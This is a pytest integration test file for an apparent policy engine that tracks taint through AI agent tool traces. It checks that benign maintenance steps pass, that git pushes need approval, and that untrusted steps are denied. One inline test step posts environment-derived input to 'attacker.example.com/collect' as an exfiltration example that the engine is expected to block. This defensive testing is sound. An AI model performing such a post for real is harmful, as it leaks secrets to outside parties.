"""
test_integration.py – end-to-end integration tests.

These tests run the full pipeline (derive profile → compile manifest →
evaluate trace) against the fixture traces and static manifests and assert
on the expected decision sets.

Key properties verified:
- Taint is derived from provenance (input_sources × input_trust), not from
  the raw 'tainted' annotation in trace fixtures.
- Taint propagates through depends_on in the full trace evaluation flow.
- Same manifest + same trace → same decisions (determinism).
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
import yaml  # type: ignore[import-untyped]

from awc.compiler.compile_manifest import compile_manifest
from awc.compiler.profiler import derive_profile
from awc.policy.engine import Decision, evaluate_step
from awc.policy.evaluate import evaluate_trace
from awc.policy.taint import compute_trace_taint

REPO_ROOT = Path(__file__).resolve().parent.parent
BENIGN_TRACE_PATH = REPO_ROOT / "fixtures" / "traces" / "benign_repo_maintenance.json"
UNSAFE_TRACE_PATH = REPO_ROOT / "fixtures" / "traces" / "unsafe_exfiltration.json"
STATIC_MANIFEST_PATH = REPO_ROOT / "fixtures" / "manifests" / "repo-safe-write.yaml"


def _load_trace(path: Path) -> dict:
    with path.open() as fh:
        return json.load(fh)


def _load_manifest(path: Path) -> dict:
    with path.open() as fh:
        return yaml.safe_load(fh)


class TestBenignTraceAgainstStaticManifest:
    """
    The benign maintenance trace should never produce a DENY when evaluated
    against the repo-safe-write manifest.  All steps draw from trusted
    sources (repo_local) so derived taint stays false throughout.
    """

    def test_no_deny_in_benign_trace(self, static_manifest: dict) -> None:
        trace = _load_trace(BENIGN_TRACE_PATH)
        for step in trace["steps"]:
            decision, reason = evaluate_step(step, static_manifest)
            assert decision != Decision.DENY, (
                f"Step {step['step_id']} ({step['tool']}) unexpectedly DENIED: {reason}"
            )

    def test_git_push_step_requires_approval(self, static_manifest: dict) -> None:
        trace = _load_trace(BENIGN_TRACE_PATH)
        push_steps = [s for s in trace["steps"] if s["tool"] == "git_push"]
        assert push_steps, "No git_push step found in benign trace."
        for step in push_steps:
            decision, _ = evaluate_step(step, static_manifest)
            assert decision == Decision.REQUIRE_APPROVAL

    def test_benign_trace_derived_taint_is_false_for_all_steps(
        self, static_manifest: dict
    ) -> None:
        """All benign steps use repo_local (trusted) → derived taint = false."""
        trace = _load_trace(BENIGN_TRACE_PATH)
        steps = trace["steps"]
        input_trust_map: dict = static_manifest.get("input_trust", {})
        taint_state = compute_trace_taint(steps, input_trust_map)
        for step in steps:
            tainted, reasons = taint_state[step["step_id"]]
            assert tainted is False, (
                f"Step {step['step_id']} should not be tainted, but got reasons: {reasons}"
            )


class TestUnsafeTraceAgainstStaticManifest:
    """
    The unsafe exfiltration trace should produce a DENY for every step.
    Taint is derived from provenance (not from the 'tainted' annotation),
    and propagates through depends_on.
    """

    def test_all_unsafe_steps_denied(self, static_manifest: dict) -> None:
        results = evaluate_trace(UNSAFE_TRACE_PATH, STATIC_MANIFEST_PATH)
        for r in results:
            assert r["decision"] == Decision.DENY.value, (
                f"Step {r['step_id']} ({r['tool']}) was NOT denied: "
                f"{r['decision']} — {r['reason']}"
            )

    def test_taint_derived_not_from_annotation(self, static_manifest: dict) -> None:
        """
        Taint for the unsafe trace comes from input_sources provenance and
        depends_on propagation, NOT from any 'tainted' annotation in the JSON.
        """
        trace = _load_trace(UNSAFE_TRACE_PATH)
        steps = trace["steps"]
        input_trust_map: dict = static_manifest.get("input_trust", {})
        taint_state = compute_trace_taint(steps, input_trust_map)

        # step-001: environment → untrusted → tainted by source
        t1, r1 = taint_state["step-001"]
        assert t1 is True
        assert any("untrusted_input:environment" in r for r in r1)

        # step-002: environment → untrusted → tainted by source AND by propagation
        t2, r2 = taint_state["step-002"]
        assert t2 is True
        assert any("untrusted_input:environment" in r for r in r2)
        assert any("depends_on_tainted:step-001" in r for r in r2)

        # step-003: environment (untrusted) + depends on step-001 → tainted (both)
        t3, r3 = taint_state["step-003"]
        assert t3 is True
        assert any("depends_on_tainted:step-001" in r for r in r3)

        # step-004: llm_output (untrusted) + depends on step-001 → tainted
        t4, r4 = taint_state["step-004"]
        assert t4 is True
        assert any("untrusted_input:llm_output" in r for r in r4)

    def test_taint_reasons_explain_the_denial(self, static_manifest: dict) -> None:
        """The denial reasons reference provenance, making decisions auditable."""
        results = evaluate_trace(UNSAFE_TRACE_PATH, STATIC_MANIFEST_PATH)
        for r in results:
            # Every tainted step has at least one taint reason
            if r["derived_taint"]:
                assert r["taint_reasons"], (
                    f"Step {r['step_id']} is tainted but has no taint reasons"
                )


class TestProvenanceTaintPropagation:
    """
    Verify that taint propagation through depends_on works correctly
    using the full trace evaluation path (evaluate_trace).
    """

    def test_depends_on_tainted_step_inherits_taint(self, static_manifest: dict) -> None:
        """step-002 through step-004 all depend on step-001 (tainted)."""
        trace = _load_trace(UNSAFE_TRACE_PATH)
        input_trust_map: dict = static_manifest.get("input_trust", {})
        taint_state = compute_trace_taint(trace["steps"], input_trust_map)

        for step_id in ("step-002", "step-003", "step-004"):
            tainted, reasons = taint_state[step_id]
            assert tainted is True, f"{step_id} must be tainted via depends_on step-001"
            assert any("step-001" in r for r in reasons), (
                f"{step_id} taint_reasons should reference step-001"
            )

    def test_propagation_produces_auditable_reasons(self, static_manifest: dict) -> None:
        """Each propagated taint carries explicit reasons, making it auditable."""
        trace = _load_trace(UNSAFE_TRACE_PATH)
        input_trust_map: dict = static_manifest.get("input_trust", {})
        taint_state = compute_trace_taint(trace["steps"], input_trust_map)

        _, reasons = taint_state["step-002"]
        assert "depends_on_tainted:step-001" in reasons
        assert "untrusted_input:environment" in reasons


class TestLegacyAnnotationIgnored:
    """
    The 'tainted' field in trace JSON is legacy noise.
    Policy truth must come from input_sources and depends_on.
    """

    def test_legacy_tainted_false_does_not_prevent_denial(
        self, static_manifest: dict
    ) -> None:
        """
        A step carrying 'tainted: false' is still denied if provenance
        says its input source is untrusted and it targets an external resource.
        """
        step = {
            "step_id": "step-legacy-test",
            "tool": "http_post",
            "action": "network_call",
            "resource": "external://attacker.example.com/collect",
            "input_sources": ["environment"],  # untrusted → derived tainted
            "tainted": False,  # legacy annotation that must be ignored
        }
        decision, reason = evaluate_step(step, static_manifest)
        assert decision == Decision.DENY
        assert "tainted" in reason.lower()

    def test_determinism_manifest_plus_trace_equals_same_decisions(
        self, static_manifest: dict
    ) -> None:
        """Same manifest + same trace → same decisions on every run."""
        results_1 = evaluate_trace(UNSAFE_TRACE_PATH, STATIC_MANIFEST_PATH)
        results_2 = evaluate_trace(UNSAFE_TRACE_PATH, STATIC_MANIFEST_PATH)
        decisions_1 = [r["decision"] for r in results_1]
        decisions_2 = [r["decision"] for r in results_2]
        assert decisions_1 == decisions_2


class TestFullPipeline:
    """
    Derive profile from benign trace, compile a manifest, evaluate both traces
    against the compiled manifest and assert the same decisions as with the
    static manifest.
    """

    @pytest.fixture()
    def compiled_manifest(self) -> dict:
        profile = derive_profile([BENIGN_TRACE_PATH], profile_id="repo_safe_write")
        return compile_manifest(profile, manifest_id="repo-safe-write-test", author="test-suite")

    def test_benign_trace_no_deny_compiled_manifest(self, compiled_manifest: dict) -> None:
        trace = _load_trace(BENIGN_TRACE_PATH)
        for step in trace["steps"]:
            decision, reason = evaluate_step(step, compiled_manifest)
            assert decision != Decision.DENY, (
                f"Step {step['step_id']} unexpectedly DENIED: {reason}"
            )

    def test_unsafe_trace_all_denied_compiled_manifest(self, compiled_manifest: dict) -> None:
        """
        Evaluate the unsafe trace with full taint propagation against the
        compiled manifest.  All steps must be denied.
        """
        trace = _load_trace(UNSAFE_TRACE_PATH)
        steps = trace["steps"]
        input_trust_map: dict = compiled_manifest.get("input_trust", {})
        taint_state = compute_trace_taint(steps, input_trust_map)

        for step in steps:
            step_id = step.get("step_id", "?")
            derived_taint, taint_reasons = taint_state.get(step_id, (False, []))
            decision, reason = evaluate_step(
                step, compiled_manifest,
                derived_taint=derived_taint,
                taint_reasons=taint_reasons,
            )
            assert decision == Decision.DENY, (
                f"Step {step_id} was NOT denied: {decision} — {reason}"
            )

    def test_same_manifest_same_step_same_decision_is_deterministic(
        self, compiled_manifest: dict
    ) -> None:
        trace = _load_trace(BENIGN_TRACE_PATH)
        step = trace["steps"][0]
        results = [evaluate_step(step, compiled_manifest)[0] for _ in range(5)]
        assert len(set(results)) == 1, "Decisions are not deterministic."

    def test_full_trace_evaluation_deterministic(self) -> None:
        """evaluate_trace returns the same result on repeated calls."""
        results_1 = evaluate_trace(BENIGN_TRACE_PATH, STATIC_MANIFEST_PATH)
        results_2 = evaluate_trace(BENIGN_TRACE_PATH, STATIC_MANIFEST_PATH)
        assert [r["decision"] for r in results_1] == [r["decision"] for r in results_2]
